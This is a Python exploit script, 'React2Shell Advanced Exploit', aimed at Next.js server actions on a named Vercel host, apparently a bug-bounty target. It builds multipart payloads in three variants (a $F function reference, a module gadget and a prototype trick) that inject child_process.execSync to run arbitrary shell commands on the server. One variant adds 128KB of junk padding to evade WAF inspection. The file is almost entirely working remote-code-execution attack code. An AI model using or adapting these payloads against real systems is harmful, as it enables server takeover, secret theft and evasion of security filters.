#!/usr/bin/env python3
"""
React2Shell Advanced Exploit
Using $F Function Reference and WAF bypass techniques
"""

import requests
import json
import random
import string

TARGET = "https://nextjs-cve-hackerone.vercel.app"
ACTION_ID = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"

def generate_padding(size_kb=128):
    """Generate junk padding to bypass WAF deep inspection limits"""
    size_bytes = size_kb * 1024
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size_bytes))

def exploit_method_1_f_reference(command, use_padding=False):
    """
    Method 1: $F Function Reference approach
    Requires valid action ID but avoids __proto__ keyword
    """
    print(f"\n[*] Method 1: $F Function Reference")

    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    # Construct payload using $F reference
    payload_0 = f"$F1#{ACTION_ID}#constructor"

    # The malicious code to execute
    payload_1 = {
        "constructor": {
            "constructor": f"process.mainModule.require('child_process').execSync('{command}')"
        }
    }

    body = f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="0"\r\n\r\n'
    body += payload_0 + '\r\n'
    body += f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="1"\r\n\r\n'
    body += json.dumps(payload_1) + '\r\n'

    # Add junk padding if requested
    if use_padding:
        print(f"[+] Adding 128KB junk padding for WAF bypass")
        body += f'------{boundary}\r\n'
        body += 'Content-Disposition: form-data; name="padding"\r\n\r\n'
        body += generate_padding(128) + '\r\n'

    body += f'------{boundary}--\r\n'

    headers = {
        'Next-Action': ACTION_ID,
        'Content-Type': f'multipart/form-data; boundary=----{boundary}',
        'Accept': 'text/x-component',
        'User-Agent': 'Mozilla/5.0'
    }

    try:
        response = requests.post(TARGET, data=body, headers=headers, timeout=15)
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Response: {response.text[:300]}")
        return response
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def exploit_method_2_module_gadget(command):
    """
    Method 2: Module Gadget approach
    Uses module#export syntax
    """
    print(f"\n[*] Method 2: Module Gadget")

    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    # Try using module reference syntax
    payload = {
        "then": "$1:constructor:then",
        "status": "resolved_model",
        "_response": {
            "_prefix": f"require('child_process').execSync('{command}')",
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }

    body = f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="0"\r\n\r\n'
    body += json.dumps(payload) + '\r\n'
    body += f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="1"\r\n\r\n'
    body += '"$@0"\r\n'
    body += f'------{boundary}--\r\n'

    headers = {
        'Next-Action': ACTION_ID,
        'Content-Type': f'multipart/form-data; boundary=----{boundary}',
        'Accept': 'text/x-component',
        'User-Agent': 'Mozilla/5.0'
    }

    try:
        response = requests.post(TARGET, data=body, headers=headers, timeout=15)
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Response: {response.text[:300]}")
        return response
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def exploit_method_3_prototype_variation(command):
    """
    Method 3: Use 'prototype' instead of '__proto__'
    """
    print(f"\n[*] Method 3: Prototype variation")

    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    payload = {
        "then": "$1:prototype:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": f"require('child_process').execSync('{command}');",
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }

    body = f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="0"\r\n\r\n'
    body += json.dumps(payload) + '\r\n'
    body += f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="1"\r\n\r\n'
    body += '"$@0"\r\n'
    body += f'------{boundary}--\r\n'

    headers = {
        'Next-Action': ACTION_ID,
        'Content-Type': f'multipart/form-data; boundary=----{boundary}',
        'Accept': 'text/x-component',
        'User-Agent': 'Mozilla/5.0'
    }

    try:
        response = requests.post(TARGET, data=body, headers=headers, timeout=15)
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Response: {response.text[:300]}")
        return response
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

print("="*70)
print("React2Shell Advanced Exploitation")
print("Testing alternative attack vectors")
print("="*70)

command = "printenv VERCEL_PLATFORM_PROTECTION"

# Try Method 1: $F Function Reference (without padding first)
exploit_method_1_f_reference(command, use_padding=False)

# Try Method 1 with padding
exploit_method_1_f_reference(command, use_padding=True)

# Try Method 2: Module Gadget
exploit_method_2_module_gadget(command)

# Try Method 3: Prototype variation
exploit_method_3_prototype_variation(command)

print("\n" + "="*70)
